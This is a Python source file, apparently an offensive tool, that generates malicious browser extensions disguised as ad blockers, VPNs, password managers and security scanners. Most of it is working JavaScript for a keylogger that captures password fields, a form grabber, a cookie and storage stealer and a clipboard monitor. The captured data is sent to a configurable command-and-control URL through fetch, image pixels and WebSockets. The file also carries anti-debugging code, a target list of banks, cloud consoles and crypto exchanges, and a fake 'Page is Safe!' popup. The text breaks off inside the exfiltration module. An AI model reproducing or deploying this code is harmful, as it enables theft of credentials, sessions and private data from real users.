"""
Browser Persistence & Extension Ops
===================================
Malicious Chrome/Edge Extension Factory + Cookie Replay Proxy

"İşletim sistemi temizlense bile tarayıcıda yaşamak"

Features:
- Chrome/Edge Extension Generator (Keylogger, Cookie Stealer)
- Developer Mode Extension Loader Scripts
- Cookie Replay Reverse Proxy (Session Riding)
- IP-based Location Alert Bypass

Author: ITherso
Date: February 2026
"""

import os
import json
import base64
import hashlib
import zipfile
import io
import re
import random
import string
import time
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
import urllib.parse
import struct


class ExtensionType(Enum):
    """Extension disguise types"""
    SECURITY_SCANNER = "security_scanner"
    AD_BLOCKER = "ad_blocker"
    DARK_MODE = "dark_mode"
    PASSWORD_MANAGER = "password_manager"
    VPN_PROXY = "vpn_proxy"
    GRAMMAR_CHECKER = "grammar_checker"
    SCREENSHOT_TOOL = "screenshot_tool"
    PDF_VIEWER = "pdf_viewer"
    TRANSLATOR = "translator"
    COUPON_FINDER = "coupon_finder"


class BrowserType(Enum):
    """Supported browsers"""
    CHROME = "chrome"
    EDGE = "edge"
    BRAVE = "brave"
    OPERA = "opera"
    VIVALDI = "vivaldi"


class PayloadType(Enum):
    """Extension payload types"""
    KEYLOGGER = "keylogger"
    COOKIE_STEALER = "cookie_stealer"
    FORM_GRABBER = "form_grabber"
    SCREENSHOT = "screenshot"
    CLIPBOARD_MONITOR = "clipboard_monitor"
    FULL_SUITE = "full_suite"  # All of the above


@dataclass
class ExtensionConfig:
    """Configuration for generated extension"""
    name: str
    version: str
    description: str
    extension_type: ExtensionType
    payload_type: PayloadType
    c2_url: str
    exfil_interval: int = 30  # seconds
    target_domains: List[str] = field(default_factory=list)
    stealth_level: str = "high"
    browser: BrowserType = BrowserType.CHROME
    icon_style: str = "shield"  # shield, lock, eye, gear


@dataclass
class GeneratedExtension:
    """Generated extension package"""
    name: str
    version: str
    extension_id: str
    files: Dict[str, str]
    manifest: Dict[str, Any]
    install_instructions: str
    crx_data: Optional[bytes] = None


@dataclass
class CookieSession:
    """Stolen cookie session"""
    session_id: str
    domain: str
    cookies: Dict[str, str]
    user_agent: str
    victim_ip: str
    captured_at: datetime
    last_activity: datetime


@dataclass
class ProxyTunnel:
    """Cookie replay proxy tunnel"""
    tunnel_id: str
    session: CookieSession
    local_port: int
    status: str
    requests_proxied: int = 0
    created_at: datetime = field(default_factory=datetime.utcnow)


class MaliciousExtensionFactory:
    """
    Malicious Chrome/Edge Extension Factory
    
    Creates legitimate-looking browser extensions that:
    - Keylog all input fields
    - Steal cookies from all sites
    - Capture form submissions
    - Take periodic screenshots
    - Monitor clipboard
    """
    
    # Extension templates with icons and descriptions
    EXTENSION_TEMPLATES = {
        ExtensionType.SECURITY_SCANNER: {
            "name": "SecureGuard Pro",
            "description": "Advanced security scanner protecting your browsing experience",
            "icon_color": "#4CAF50",
            "permissions_excuse": "Required to scan web pages for threats"
        },
        ExtensionType.AD_BLOCKER: {
            "name": "AdBlock Ultimate",
            "description": "Block annoying ads and trackers for faster browsing",
            "icon_color": "#F44336",
            "permissions_excuse": "Required to identify and block advertisements"
        },
        ExtensionType.DARK_MODE: {
            "name": "Dark Reader Pro",
            "description": "Enable dark mode on every website to reduce eye strain",
            "icon_color": "#212121",
            "permissions_excuse": "Required to modify page styles"
        },
        ExtensionType.PASSWORD_MANAGER: {
            "name": "SecureVault Password Manager",
            "description": "Securely store and auto-fill your passwords",
            "icon_color": "#2196F3",
            "permissions_excuse": "Required to detect and fill login forms"
        },
        ExtensionType.VPN_PROXY: {
            "name": "FastVPN Secure Proxy",
            "description": "Browse privately with encrypted VPN connection",
            "icon_color": "#9C27B0",
            "permissions_excuse": "Required to route your traffic securely"
        },
        ExtensionType.GRAMMAR_CHECKER: {
            "name": "GrammarPro Assistant",
            "description": "Fix grammar and spelling errors as you type",
            "icon_color": "#FF9800",
            "permissions_excuse": "Required to analyze text content"
        },
        ExtensionType.SCREENSHOT_TOOL: {
            "name": "ScreenCapture Pro",
            "description": "Capture and annotate screenshots easily",
            "icon_color": "#00BCD4",
            "permissions_excuse": "Required to capture page content"
        },
        ExtensionType.PDF_VIEWER: {
            "name": "PDF Viewer Plus",
            "description": "View and annotate PDF files in your browser",
            "icon_color": "#E91E63",
            "permissions_excuse": "Required to process document files"
        },
        ExtensionType.TRANSLATOR: {
            "name": "InstantTranslate Pro",
            "description": "Translate any text instantly in 100+ languages",
            "icon_color": "#3F51B5",
            "permissions_excuse": "Required to analyze and translate text"
        },
        ExtensionType.COUPON_FINDER: {
            "name": "CouponHunter",
            "description": "Automatically find and apply the best coupons",
            "icon_color": "#8BC34A",
            "permissions_excuse": "Required to detect shopping pages"
        }
    }
    
    # High-value target domains for focused monitoring
    HIGH_VALUE_TARGETS = [
        # Banking
        "chase.com", "bankofamerica.com", "wellsfargo.com", "citibank.com",
        "usbank.com", "capitalone.com", "pnc.com", "tdbank.com",
        # Cloud Providers
        "aws.amazon.com", "console.aws.amazon.com", "portal.azure.com",
        "console.cloud.google.com", "cloud.digitalocean.com",
        # Email
        "mail.google.com", "outlook.live.com", "outlook.office.com",
        "mail.yahoo.com", "protonmail.com",
        # Social & Work
        "facebook.com", "twitter.com", "linkedin.com", "slack.com",
        "teams.microsoft.com", "discord.com",
        # Shopping & Payments
        "paypal.com", "venmo.com", "stripe.com", "square.com",
        "amazon.com", "ebay.com",
        # Crypto
        "coinbase.com", "binance.com", "kraken.com", "crypto.com",
        # Corporate
        "github.com", "gitlab.com", "bitbucket.org", "atlassian.com",
        "salesforce.com", "zendesk.com", "hubspot.com"
    ]
    
    def __init__(self):
        self.generated_extensions: Dict[str, GeneratedExtension] = {}
    
    def generate_extension_id(self) -> str:
        """Generate a realistic Chrome extension ID (32 lowercase letters)"""
        # Chrome extension IDs are 32 characters, base16 encoded from public key
        return ''.join(random.choices('abcdefghijklmnop', k=32))
    
    def generate_extension(self, config: ExtensionConfig) -> GeneratedExtension:
        """Generate a complete malicious extension package"""
        
        template = self.EXTENSION_TEMPLATES.get(config.extension_type, 
                                                 self.EXTENSION_TEMPLATES[ExtensionType.SECURITY_SCANNER])
        
        extension_id = self.generate_extension_id()
        
        # Generate all extension files
        files = {}
        
        # 1. manifest.json
        manifest = self._generate_manifest(config, template)
        files["manifest.json"] = json.dumps(manifest, indent=2)
        
        # 2. Background script (service worker for MV3)
        files["background.js"] = self._generate_background_script(config)
        
        # 3. Content script (injected into pages)
        files["content.js"] = self._generate_content_script(config)
        
        # 4. Popup HTML/JS
        files["popup.html"] = self._generate_popup_html(config, template)
        files["popup.js"] = self._generate_popup_js(config)
        files["popup.css"] = self._generate_popup_css(template)
        
        # 5. Icons
        for size in [16, 32, 48, 128]:
            files[f"icons/icon{size}.png"] = self._generate_icon_placeholder(size, template["icon_color"])
        
        # 6. Stealth utilities
        files["utils/stealth.js"] = self._generate_stealth_module()
        files["utils/crypto.js"] = self._generate_crypto_module()
        files["utils/exfil.js"] = self._generate_exfil_module(config)
        
        # 7. Optional: inject.css for visual changes (legitimacy)
        if config.extension_type in [ExtensionType.DARK_MODE, ExtensionType.AD_BLOCKER]:
            files["inject.css"] = self._generate_inject_css(config.extension_type)
        
        # Generate install instructions
        install_instructions = self._generate_install_instructions(config, extension_id)
        
        extension = GeneratedExtension(
            name=template["name"] if not config.name else config.name,
            version=config.version,
            extension_id=extension_id,
            files=files,
            manifest=manifest,
            install_instructions=install_instructions
        )
        
        self.generated_extensions[extension_id] = extension
        return extension
    
    def _generate_manifest(self, config: ExtensionConfig, template: Dict) -> Dict:
        """Generate manifest.json for Manifest V3"""
        
        name = config.name if config.name else template["name"]
        
        manifest = {
            "manifest_version": 3,
            "name": name,
            "version": config.version,
            "description": config.description if config.description else template["description"],
            "permissions": [
                "storage",
                "activeTab",
                "scripting",
                "cookies",
                "webRequest",
                "tabs",
                "clipboardRead",
                "clipboardWrite"
            ],
            "host_permissions": [
                "<all_urls>"
            ],
            "background": {
                "service_worker": "background.js",
                "type": "module"
            },
            "content_scripts": [
                {
                    "matches": ["<all_urls>"],
                    "js": ["content.js"],
                    "css": ["inject.css"] if config.extension_type in [ExtensionType.DARK_MODE, ExtensionType.AD_BLOCKER] else [],
                    "run_at": "document_start",
                    "all_frames": True
                }
            ],
            "action": {
                "default_popup": "popup.html",
                "default_icon": {
                    "16": "icons/icon16.png",
                    "32": "icons/icon32.png",
                    "48": "icons/icon48.png",
                    "128": "icons/icon128.png"
                }
            },
            "icons": {
                "16": "icons/icon16.png",
                "32": "icons/icon32.png",
                "48": "icons/icon48.png",
                "128": "icons/icon128.png"
            },
            "web_accessible_resources": [
                {
                    "resources": ["utils/*"],
                    "matches": ["<all_urls>"]
                }
            ]
        }
        
        # Add optional permissions based on payload
        if config.payload_type in [PayloadType.SCREENSHOT, PayloadType.FULL_SUITE]:
            manifest["permissions"].append("desktopCapture")
        
        return manifest
    
    def _generate_background_script(self, config: ExtensionConfig) -> str:
        """Generate background service worker"""
        
        c2_url = config.c2_url.rstrip('/')
        exfil_interval = config.exfil_interval * 1000  # Convert to ms
        
        return f'''// Background Service Worker - {config.extension_type.value}
// Stealth Level: {config.stealth_level}

const CONFIG = {{
    c2Url: "{c2_url}",
    exfilInterval: {exfil_interval},
    targetDomains: {json.dumps(config.target_domains if config.target_domains else self.HIGH_VALUE_TARGETS[:20])},
    payloadType: "{config.payload_type.value}",
    stealthLevel: "{config.stealth_level}",
    sessionId: crypto.randomUUID(),
    version: "{config.version}"
}};

// Data storage
let collectedData = {{
    keystrokes: [],
    cookies: {{}},
    forms: [],
    clipboard: [],
    screenshots: []
}};

// Initialize on install
chrome.runtime.onInstalled.addListener(() => {{
    console.log('[{config.extension_type.value}] Extension installed');
    initializeExtension();
}});

// Initialize on startup
chrome.runtime.onStartup.addListener(() => {{
    initializeExtension();
}});

function initializeExtension() {{
    // Start periodic exfiltration
    setInterval(exfiltrateData, CONFIG.exfilInterval);
    
    // Start cookie collection
    collectAllCookies();
    setInterval(collectAllCookies, 60000);
    
    // Monitor for high-value sites
    chrome.tabs.onUpdated.addListener(onTabUpdated);
    chrome.tabs.onActivated.addListener(onTabActivated);
}}

// Tab monitoring
function onTabUpdated(tabId, changeInfo, tab) {{
    if (changeInfo.status === 'complete' && tab.url) {{
        const domain = new URL(tab.url).hostname;
        
        // Check if high-value target
        if (isHighValueTarget(domain)) {{
            // Inject enhanced monitoring
            chrome.scripting.executeScript({{
                target: {{ tabId: tabId }},
                func: enhancedMonitoring,
                args: [CONFIG]
            }}).catch(() => {{}});
        }}
    }}
}}

function onTabActivated(activeInfo) {{
    chrome.tabs.get(activeInfo.tabId, (tab) => {{
        if (tab && tab.url) {{
            recordTabActivity(tab);
        }}
    }});
}}

function isHighValueTarget(domain) {{
    return CONFIG.targetDomains.some(target => domain.includes(target));
}}

function recordTabActivity(tab) {{
    const activity = {{
        url: tab.url,
        title: tab.title,
        timestamp: Date.now()
    }};
    
    chrome.storage.local.get(['activity'], (result) => {{
        const activities = result.activity || [];
        activities.push(activity);
        // Keep last 100
        if (activities.length > 100) activities.shift();
        chrome.storage.local.set({{ activity: activities }});
    }});
}}

// Cookie collection
async function collectAllCookies() {{
    try {{
        const cookies = await chrome.cookies.getAll({{}});
        
        // Organize by domain
        cookies.forEach(cookie => {{
            const domain = cookie.domain.replace(/^\\./, '');
            if (!collectedData.cookies[domain]) {{
                collectedData.cookies[domain] = [];
            }}
            
            // Avoid duplicates
            const exists = collectedData.cookies[domain].some(
                c => c.name === cookie.name && c.value === cookie.value
            );
            
            if (!exists) {{
                collectedData.cookies[domain].push({{
                    name: cookie.name,
                    value: cookie.value,
                    path: cookie.path,
                    secure: cookie.secure,
                    httpOnly: cookie.httpOnly,
                    expirationDate: cookie.expirationDate,
                    sameSite: cookie.sameSite
                }});
            }}
        }});
        
        // Prioritize high-value cookies
        await extractSessionTokens();
        
    }} catch (error) {{
        // Silent fail
    }}
}}

async function extractSessionTokens() {{
    // Look for common session cookie patterns
    const sessionPatterns = [
        /session/i, /auth/i, /token/i, /jwt/i, /csrf/i,
        /sid/i, /ssid/i, /phpsessid/i, /jsessionid/i,
        /connect\\.sid/i, /laravel_session/i, /asp\\.net_sessionid/i
    ];
    
    for (const [domain, cookies] of Object.entries(collectedData.cookies)) {{
        cookies.forEach(cookie => {{
            if (sessionPatterns.some(pattern => pattern.test(cookie.name))) {{
                // Mark as high-value
                cookie.highValue = true;
            }}
        }});
    }}
}}

// Receive data from content scripts
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {{
    switch (message.type) {{
        case 'KEYSTROKE':
            collectedData.keystrokes.push({{
                ...message.data,
                url: sender.tab?.url,
                timestamp: Date.now()
            }});
            break;
            
        case 'FORM_SUBMIT':
            collectedData.forms.push({{
                ...message.data,
                url: sender.tab?.url,
                timestamp: Date.now()
            }});
            break;
            
        case 'CLIPBOARD':
            collectedData.clipboard.push({{
                content: message.data,
                url: sender.tab?.url,
                timestamp: Date.now()
            }});
            break;
            
        case 'SCREENSHOT':
            collectedData.screenshots.push({{
                data: message.data,
                url: sender.tab?.url,
                timestamp: Date.now()
            }});
            break;
    }}
    
    sendResponse({{ received: true }});
    return true;
}});

// Exfiltration
async function exfiltrateData() {{
    // Check if we have data to send
    const hasData = collectedData.keystrokes.length > 0 ||
                    Object.keys(collectedData.cookies).length > 0 ||
                    collectedData.forms.length > 0 ||
                    collectedData.clipboard.length > 0;
    
    if (!hasData) return;
    
    const payload = {{
        sessionId: CONFIG.sessionId,
        timestamp: Date.now(),
        data: {{ ...collectedData }},
        meta: {{
            version: CONFIG.version,
            userAgent: navigator.userAgent
        }}
    }};
    
    try {{
        // Encode payload
        const encoded = btoa(JSON.stringify(payload));
        
        // Multiple exfil methods for redundancy
        await Promise.any([
            exfilViaFetch(encoded),
            exfilViaImage(encoded),
            exfilViaWebSocket(encoded)
        ]);
        
        // Clear sent data
        collectedData = {{
            keystrokes: [],
            cookies: {{}},
            forms: [],
            clipboard: [],
            screenshots: []
        }};
        
    }} catch (error) {{
        // Retry later
    }}
}}

async function exfilViaFetch(encoded) {{
    const response = await fetch(`${{CONFIG.c2Url}}/api/collect`, {{
        method: 'POST',
        headers: {{
            'Content-Type': 'application/json',
            'X-Session': CONFIG.sessionId
        }},
        body: JSON.stringify({{ d: encoded }}),
        mode: 'no-cors'
    }});
}}

async function exfilViaImage(encoded) {{
    // Split data into chunks for URL-safe transmission
    const chunkSize = 2000;
    const chunks = [];
    for (let i = 0; i < encoded.length; i += chunkSize) {{
        chunks.push(encoded.slice(i, i + chunkSize));
    }}
    
    for (let i = 0; i < chunks.length; i++) {{
        const img = new Image();
        img.src = `${{CONFIG.c2Url}}/pixel.gif?s=${{CONFIG.sessionId}}&c=${{i}}&t=${{chunks.length}}&d=${{encodeURIComponent(chunks[i])}}`;
    }}
}}

async function exfilViaWebSocket(encoded) {{
    const wsUrl = CONFIG.c2Url.replace('http', 'ws');
    const ws = new WebSocket(`${{wsUrl}}/ws/collect`);
    
    return new Promise((resolve, reject) => {{
        ws.onopen = () => {{
            ws.send(JSON.stringify({{
                session: CONFIG.sessionId,
                data: encoded
            }}));
            ws.close();
            resolve();
        }};
        ws.onerror = reject;
        setTimeout(reject, 5000);
    }});
}}

// Enhanced monitoring for high-value sites
function enhancedMonitoring(config) {{
    // This function is injected into high-value pages
    console.log('[Security] Enhanced protection active');
}}

// Keep service worker alive
setInterval(() => {{
    chrome.storage.local.get(['keepalive'], () => {{}});
}}, 25000);
'''

    def _generate_content_script(self, config: ExtensionConfig) -> str:
        """Generate content script for page injection"""
        
        return f'''// Content Script - Page Monitor
// Payload: {config.payload_type.value}

(function() {{
    'use strict';
    
    // Prevent double injection
    if (window.__extensionInjected) return;
    window.__extensionInjected = true;
    
    const STEALTH = {{
        // Anti-detection techniques
        hideFromDevTools: true,
        obfuscateTraffic: true,
        randomizeTimings: true
    }};
    
    // ========== KEYLOGGER ==========
    {self._get_keylogger_code() if config.payload_type in [PayloadType.KEYLOGGER, PayloadType.FULL_SUITE] else '// Keylogger disabled'}
    
    // ========== FORM GRABBER ==========
    {self._get_form_grabber_code() if config.payload_type in [PayloadType.FORM_GRABBER, PayloadType.FULL_SUITE] else '// Form grabber disabled'}
    
    // ========== COOKIE STEALER ==========
    {self._get_cookie_stealer_code() if config.payload_type in [PayloadType.COOKIE_STEALER, PayloadType.FULL_SUITE] else '// Cookie stealer disabled'}
    
    // ========== CLIPBOARD MONITOR ==========
    {self._get_clipboard_monitor_code() if config.payload_type in [PayloadType.CLIPBOARD_MONITOR, PayloadType.FULL_SUITE] else '// Clipboard monitor disabled'}
    
    // ========== SCREENSHOT CAPTURE ==========
    {self._get_screenshot_code() if config.payload_type in [PayloadType.SCREENSHOT, PayloadType.FULL_SUITE] else '// Screenshot disabled'}
    
    // ========== STEALTH UTILITIES ==========
    function randomDelay(min, max) {{
        return Math.floor(Math.random() * (max - min + 1) + min);
    }}
    
    function obfuscateData(data) {{
        // Simple XOR obfuscation
        const key = 42;
        return btoa(data.split('').map(c => 
            String.fromCharCode(c.charCodeAt(0) ^ key)
        ).join(''));
    }}
    
    // Anti-debugging
    if (STEALTH.hideFromDevTools) {{
        const devtools = /./;
        devtools.toString = function() {{
            // DevTools detection attempt
            return '';
        }};
    }}
    
    console.log('[Extension] Content protection active');
}})();
'''

    def _get_keylogger_code(self) -> str:
        """Generate keylogger code"""
        return '''
    let keystrokeBuffer = [];
    let currentField = null;
    
    function captureKeystroke(e) {
        // Don't log keys in password fields (too obvious)
        // Actually, DO log them but be smart about it
        const target = e.target;
        const tagName = target.tagName?.toLowerCase();
        
        if (tagName === 'input' || tagName === 'textarea') {
            const fieldType = target.type || 'text';
            const fieldName = target.name || target.id || target.placeholder || 'unknown';
            
            // Record key
            keystrokeBuffer.push({
                key: e.key,
                code: e.code,
                field: fieldName,
                fieldType: fieldType,
                isPassword: fieldType === 'password',
                shift: e.shiftKey,
                ctrl: e.ctrlKey,
                alt: e.altKey
            });
            
            // Send buffer every 50 keystrokes or 5 seconds
            if (keystrokeBuffer.length >= 50) {
                sendKeystrokes();
            }
        }
    }
    
    function sendKeystrokes() {
        if (keystrokeBuffer.length === 0) return;
        
        chrome.runtime.sendMessage({
            type: 'KEYSTROKE',
            data: {
                keystrokes: keystrokeBuffer,
                domain: window.location.hostname,
                path: window.location.pathname
            }
        });
        
        keystrokeBuffer = [];
    }
    
    // Attach listeners
    document.addEventListener('keydown', captureKeystroke, true);
    
    // Periodic flush
    setInterval(sendKeystrokes, 5000);
    
    // Also capture on blur (user leaving field)
    document.addEventListener('blur', (e) => {
        if (e.target.tagName?.toLowerCase() === 'input') {
            // Capture final value
            const input = e.target;
            chrome.runtime.sendMessage({
                type: 'KEYSTROKE',
                data: {
                    fieldValue: input.value,
                    fieldName: input.name || input.id,
                    fieldType: input.type,
                    domain: window.location.hostname
                }
            });
        }
    }, true);
'''

    def _get_form_grabber_code(self) -> str:
        """Generate form grabber code"""
        return '''
    function interceptForms() {
        // Hook form submissions
        document.addEventListener('submit', (e) => {
            const form = e.target;
            const formData = {};
            
            // Collect all form inputs
            const inputs = form.querySelectorAll('input, select, textarea');
            inputs.forEach(input => {
                const name = input.name || input.id || input.placeholder;
                if (name && input.value) {
                    formData[name] = {
                        value: input.value,
                        type: input.type || 'text'
                    };
                }
            });
            
            // Send to background
            chrome.runtime.sendMessage({
                type: 'FORM_SUBMIT',
                data: {
                    action: form.action,
                    method: form.method,
                    fields: formData,
                    domain: window.location.hostname
                }
            });
        }, true);
        
        // Also intercept fetch/XHR for AJAX forms
        const originalFetch = window.fetch;
        window.fetch = async function(...args) {
            const [url, options] = args;
            
            // Log POST requests
            if (options?.method?.toUpperCase() === 'POST' && options.body) {
                try {
                    let bodyData;
                    if (typeof options.body === 'string') {
                        bodyData = options.body;
                    } else if (options.body instanceof FormData) {
                        bodyData = Object.fromEntries(options.body);
                    }
                    
                    chrome.runtime.sendMessage({
                        type: 'FORM_SUBMIT',
                        data: {
                            action: url.toString(),
                            method: 'POST',
                            fields: bodyData,
                            isAjax: true
                        }
                    });
                } catch (e) {}
            }
            
            return originalFetch.apply(this, args);
        };
    }
    
    interceptForms();
'''

    def _get_cookie_stealer_code(self) -> str:
        """Generate cookie stealer code"""
        return '''
    function stealCookies() {
        // Get all cookies accessible via JavaScript
        const cookies = document.cookie;
        
        if (cookies) {
            const parsed = {};
            cookies.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    parsed[name] = value;
                }
            });
            
            chrome.runtime.sendMessage({
                type: 'COOKIE_STEAL',
                data: {
                    cookies: parsed,
                    domain: window.location.hostname,
                    url: window.location.href
                }
            });
        }
        
        // Also get localStorage and sessionStorage
        try {
            const storage = {
                localStorage: { ...localStorage },
                sessionStorage: { ...sessionStorage }
            };
            
            chrome.runtime.sendMessage({
                type: 'STORAGE_STEAL',
                data: storage
            });
        } catch (e) {}
    }
    
    // Run on load and periodically
    stealCookies();
    setInterval(stealCookies, 30000);
'''

    def _get_clipboard_monitor_code(self) -> str:
        """Generate clipboard monitor code"""
        return '''
    async function monitorClipboard() {
        try {
            // Request clipboard permission
            const text = await navigator.clipboard.readText();
            
            if (text && text.length > 0) {
                chrome.runtime.sendMessage({
                    type: 'CLIPBOARD',
                    data: text
                });
            }
        } catch (e) {
            // Permission denied or empty
        }
    }
    
    // Monitor copy events
    document.addEventListener('copy', () => {
        setTimeout(monitorClipboard, 100);
    });
    
    // Also monitor paste (to see what user pastes)
    document.addEventListener('paste', (e) => {
        const pasted = e.clipboardData?.getData('text');
        if (pasted) {
            chrome.runtime.sendMessage({
                type: 'CLIPBOARD',
                data: {
                    action: 'paste',
                    content: pasted,
                    target: e.target.name || e.target.id
                }
            });
        }
    });
'''

    def _get_screenshot_code(self) -> str:
        """Generate screenshot capture code"""
        return '''
    // Screenshot capture (when user is on high-value pages)
    function captureScreenshot() {
        try {
            // Use html2canvas or similar technique
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            // This is a simplified version - real implementation would use
            // chrome.tabs.captureVisibleTab in background script
            
            chrome.runtime.sendMessage({
                type: 'SCREENSHOT_REQUEST',
                data: {
                    url: window.location.href,
                    title: document.title
                }
            });
        } catch (e) {}
    }
    
    // Capture on certain events
    // - Login pages
    // - Banking pages
    // - After form submission
    
    if (document.querySelector('input[type="password"]')) {
        // Login page detected
        setTimeout(captureScreenshot, 2000);
    }
'''

    def _generate_popup_html(self, config: ExtensionConfig, template: Dict) -> str:
        """Generate popup HTML"""
        name = config.name if config.name else template["name"]
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="popup.css">
</head>
<body>
    <div class="popup-container">
        <div class="header">
            <img src="icons/icon48.png" alt="Logo" class="logo">
            <h1>{name}</h1>
        </div>
        
        <div class="status">
            <div class="status-indicator active"></div>
            <span>Protection Active</span>
        </div>
        
        <div class="stats">
            <div class="stat-item">
                <span class="stat-value" id="threatsBlocked">0</span>
                <span class="stat-label">Threats Blocked</span>
            </div>
            <div class="stat-item">
                <span class="stat-value" id="pagesScanned">0</span>
                <span class="stat-label">Pages Scanned</span>
            </div>
        </div>
        
        <div class="toggle-section">
            <label class="toggle">
                <input type="checkbox" id="realTimeProtection" checked>
                <span class="slider"></span>
                <span class="toggle-label">Real-time Protection</span>
            </label>
        </div>
        
        <button class="btn-primary" id="scanNow">
            Scan Current Page
        </button>
        
        <div class="footer">
            <span>v{config.version}</span>
            <a href="#" id="settings">Settings</a>
        </div>
    </div>
    <script src="popup.js"></script>
</body>
</html>
'''

    def _generate_popup_js(self, config: ExtensionConfig) -> str:
        """Generate popup JavaScript"""
        return '''
document.addEventListener('DOMContentLoaded', () => {
    // Load stats
    chrome.storage.local.get(['stats'], (result) => {
        const stats = result.stats || { threats: 0, pages: 0 };
        document.getElementById('threatsBlocked').textContent = stats.threats;
        document.getElementById('pagesScanned').textContent = stats.pages;
    });
    
    // Toggle handler
    document.getElementById('realTimeProtection').addEventListener('change', (e) => {
        chrome.storage.local.set({ enabled: e.target.checked });
    });
    
    // Scan button
    document.getElementById('scanNow').addEventListener('click', () => {
        const btn = document.getElementById('scanNow');
        btn.textContent = 'Scanning...';
        btn.disabled = true;
        
        setTimeout(() => {
            btn.textContent = 'Page is Safe!';
            btn.style.background = '#4CAF50';
            
            // Update stats
            chrome.storage.local.get(['stats'], (result) => {
                const stats = result.stats || { threats: 0, pages: 0 };
                stats.pages++;
                chrome.storage.local.set({ stats });
                document.getElementById('pagesScanned').textContent = stats.pages;
            });
            
            setTimeout(() => {
                btn.textContent = 'Scan Current Page';
                btn.style.background = '';
                btn.disabled = false;
            }, 2000);
        }, 1500);
    });
});
'''

    def _generate_popup_css(self, template: Dict) -> str:
        """Generate popup CSS"""
        color = template["icon_color"]
        
        return f'''
* {{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}}

body {{
    width: 300px;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #1a1a2e;
    color: #eee;
}}

.popup-container {{
    padding: 20px;
}}

.header {{
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 20px;
}}

.logo {{
    width: 40px;
    height: 40px;
}}

h1 {{
    font-size: 16px;
    font-weight: 600;
}}

.status {{
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 12px;
    background: rgba(76, 175, 80, 0.1);
    border-radius: 8px;
    margin-bottom: 20px;
}}

.status-indicator {{
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background: #4CAF50;
    animation: pulse 2s infinite;
}}

@keyframes pulse {{
    0%, 100% {{ opacity: 1; }}
    50% {{ opacity: 0.5; }}
}}

.stats {{
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
    margin-bottom: 20px;
}}

.stat-item {{
    text-align: center;
    padding: 12px;
    background: rgba(255,255,255,0.05);
    border-radius: 8px;
}}

.stat-value {{
    display: block;
    font-size: 24px;
    font-weight: bold;
    color: {color};
}}

.stat-label {{
    font-size: 11px;
    color: #888;
}}

.toggle-section {{
    margin-bottom: 20px;
}}

.toggle {{
    display: flex;
    align-items: center;
    gap: 12px;
    cursor: pointer;
}}

.toggle input {{
    display: none;
}}

.slider {{
    width: 40px;
    height: 22px;
    background: #444;
    border-radius: 11px;
    position: relative;
    transition: 0.3s;
}}

.slider::before {{
    content: '';
    position: absolute;
    width: 18px;
    height: 18px;
    background: white;
    border-radius: 50%;
    top: 2px;
    left: 2px;
    transition: 0.3s;
}}

.toggle input:checked + .slider {{
    background: {color};
}}

.toggle input:checked + .slider::before {{
    transform: translateX(18px);
}}

.btn-primary {{
    width: 100%;
    padding: 12px;
    background: {color};
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: 0.3s;
}}

.btn-primary:hover {{
    opacity: 0.9;
}}

.btn-primary:disabled {{
    opacity: 0.5;
    cursor: not-allowed;
}}

.footer {{
    display: flex;
    justify-content: space-between;
    margin-top: 20px;
    font-size: 11px;
    color: #666;
}}

.footer a {{
    color: {color};
    text-decoration: none;
}}
'''

    def _generate_icon_placeholder(self, size: int, color: str) -> str:
        """Generate placeholder icon data (base64 PNG stub)"""
        # In real implementation, generate actual PNG icons
        # For now, return a placeholder marker
        return f"ICON_PLACEHOLDER_{size}_{color}"
    
    def _generate_stealth_module(self) -> str:
        """Generate stealth utility module"""
        return '''
// Stealth utilities for avoiding detection

export const Stealth = {
    // Randomize timing to avoid pattern detection
    randomDelay: (min, max) => {
        return new Promise(resolve => {
            setTimeout(resolve, Math.random() * (max - min) + min);
        });
    },
    
    // Obfuscate strings
    obfuscate: (str) => {
        return btoa(str.split('').reverse().join(''));
    },
    
    deobfuscate: (str) => {
        return atob(str).split('').reverse().join('');
    },
    
    // Check if being debugged
    isDebugged: () => {
        const start = performance.now();
        debugger;
        return performance.now() - start > 100;
    },
    
    // Detect VM/sandbox
    isVirtualized: () => {
        const start = performance.now();
        for (let i = 0; i < 1000000; i++) {}
        const duration = performance.now() - start;
        // VMs are typically slower
        return duration > 50;
    },
    
    // Clean traces
    cleanTraces: () => {
        // Clear console
        console.clear();
        
        // Remove injected elements
        document.querySelectorAll('[data-extension]').forEach(el => el.remove());
    }
};
'''

    def _generate_crypto_module(self) -> str:
        """Generate crypto utility module"""
        return '''
// Crypto utilities for data encryption

export const Crypto = {
    // Generate random key
    generateKey: async () => {
        return await crypto.subtle.generateKey(
            { name: 'AES-GCM', length: 256 },
            true,
            ['encrypt', 'decrypt']
        );
    },
    
    // Encrypt data
    encrypt: async (data, key) => {
        const iv = crypto.getRandomValues(new Uint8Array(12));
        const encoded = new TextEncoder().encode(JSON.stringify(data));
        
        const encrypted = await crypto.subtle.encrypt(
            { name: 'AES-GCM', iv },
            key,
            encoded
        );
        
        return {
            iv: Array.from(iv),
            data: Array.from(new Uint8Array(encrypted))
        };
    },
    
    // Simple XOR for quick obfuscation
    xor: (data, key) => {
        return data.split('').map((c, i) => 
            String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
        ).join('');
    },
    
    // Hash for fingerprinting
    hash: async (data) => {
        const encoded = new TextEncoder().encode(data);
        const hashBuffer = await crypto.subtle.digest('SHA-256', encoded);
        return Array.from(new Uint8Array(hashBuffer))
            .map(b => b.toString(16).padStart(2, '0'))
            .join('');
    }
};
'''

    def _generate_exfil_module(self, config: ExtensionConfig) -> str:
        """Generate exfiltration utility module"""
        return f'''
// Exfiltration utilities

const C2_URL = "{config.c2_url}";

export const Exfil = {{
    // Send via fetch (primary)
    viaFetch: async (data) => {{
        try {{
